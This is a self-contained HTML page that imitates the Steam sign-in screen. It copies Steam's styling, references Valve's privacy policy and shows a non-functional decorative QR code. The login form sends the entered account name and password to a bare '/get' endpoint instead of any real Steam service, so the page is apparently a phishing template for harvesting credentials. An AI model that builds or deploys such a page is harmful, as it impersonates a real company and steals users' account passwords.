<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
    <title>Steam Login</title>
    <style>
      body {
        font-family: -apple-system, BlinkMacSystemFont, 'Motiva Sans', Arial, sans-serif;
        background: #1b2838;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        margin: 0;
      }
      .login-container {
        width: 340px;
        padding: 0 16px 16px;
        text-align: center;
      }
      .g-h1 {
        font-size: 28px;
        font-weight: 300;
        color: #fff;
        margin-bottom: 4px;
        letter-spacing: 0.5px;
      }
      .g-h2 {
        font-size: 12px;
        color: #fff;
        margin-bottom: 20px;
        opacity: 0.6;
      }
      .g-input {
        width: 100%;
        padding: 10px 12px;
        border: 1px solid rgba(255,255,255,0.2);
        border-radius: 3px;
        font-size: 14px;
        margin-bottom: 12px;
        box-sizing: border-box;
        outline: none;
        background: rgba(0,0,0,0.3);
        color: #fff;
      }
      .g-input:focus {
        border-color: #66c0f4;
      }
      .gbtn-primary {
        width: 100%;
        padding: 10px;
        background: linear-gradient(to right, #47bfff 5%, #1a44c2 60%);
        background-position: 29%;
        color: #fff;
        border: none;
        border-radius: 3px;
        font-size: 16px;
        font-weight: 500;
        cursor: pointer;
      }
      .gbtn-primary:hover {
        background: linear-gradient(to right, #47bfff 5%, #1a44c2 60%);
        background-position: 60%;
      }
      .remember {
        display: flex;
        align-items: center;
        gap: 6px;
        margin: 12px 0;
        color: #8f98a0;
        font-size: 12px;
      }
      .remember input {
        accent-color: #66c0f4;
      }
      .forgot {
        display: block;
        color: #66c0f4;
        font-size: 12px;
        text-decoration: none;
        margin-top: 12px;
        text-align: left;
      }
      .forgot:hover {
        text-decoration: underline;
      }
      .qr-section {
        margin-top: 24px;
        padding-top: 16px;
        border-top: 1px solid rgba(255,255,255,0.1);
      }
      .qr-section h3 {
        font-size: 14px;
        color: #8f98a0;
        font-weight: 400;
        margin-bottom: 12px;
      }
      .qr-box {
        width: 100px;
        height: 100px;
        background: #fff;
        margin: 0 auto;
        display: flex;
        align-items: center;
        justify-content: center;
        border-radius: 4px;
      }
      .footer {
        margin-top: 20px;
        font-size: 12px;
        color: #8f98a0;
      }
      .footer a {
        color: #66c0f4;
        text-decoration: none;
      }
    </style>
  </head>
  <body>
    <div class="login-container">
      <h1 class="g-h1">Sign in</h1>
      <p class="g-h2">by logging in, you agree to the Valve Privacy Policy</p>
      <form action="/get" method="POST">
        <input class="g-input" type="text" name="username" placeholder="SIGN IN WITH ACCOUNT NAME" required>
        <input class="g-input" type="password" name="password" placeholder="PASSWORD" required>
        <button type="submit" class="gbtn-primary">Sign In</button>
        <div class="remember">
          <input type="checkbox" id="remember">
          <label for="remember">Remember me</label>
        </div>
      </form>
      <a href="#" class="forgot">Help, I can't sign in</a>
      <div class="qr-section">
        <h3>Or sign in using a QR code</h3>
        <div class="qr-box">
          <svg viewBox="0 0 60 60" width="60" height="60">
            <rect width="60" height="60" fill="#fff"/>
            <rect x="5" y="5" width="15" height="15" fill="#000"/>
            <rect x="40" y="5" width="15" height="15" fill="#000"/>
            <rect x="5" y="40" width="15" height="15" fill="#000"/>
            <rect x="25" y="25" width="10" height="10" fill="#000"/>
            <rect x="7" y="7" width="11" height="11" fill="#fff"/>
            <rect x="9" y="9" width="7" height="7" fill="#000"/>
            <rect x="42" y="7" width="11" height="11" fill="#fff"/>
            <rect x="44" y="9" width="7" height="7" fill="#000"/>
            <rect x="7" y="42" width="11" height="11" fill="#fff"/>
            <rect x="9" y="44" width="7" height="7" fill="#000"/>
            <rect x="25" y="5" width="5" height="5" fill="#000"/>
            <rect x="35" y="5" width="5" height="5" fill="#000"/>
            <rect x="5" y="25" width="5" height="5" fill="#000"/>
            <rect x="5" y="35" width="5" height="5" fill="#000"/>
            <rect x="40" y="25" width="5" height="5" fill="#000"/>
            <rect x="50" y="25" width="5" height="5" fill="#000"/>
            <rect x="25" y="40" width="5" height="5" fill="#000"/>
            <rect x="35" y="40" width="5" height="5" fill="#000"/>
            <rect x="40" y="40" width="15" height="15" fill="#000"/>
            <rect x="42" y="42" width="11" height="11" fill="#fff"/>
            <rect x="44" y="44" width="7" height="7" fill="#000"/>
          </svg>
        </div>
      </div>
      <p class="footer">Don't have a Steam account? <a href="#">Create a free account</a></p>
    </div>
  </body>
</html>
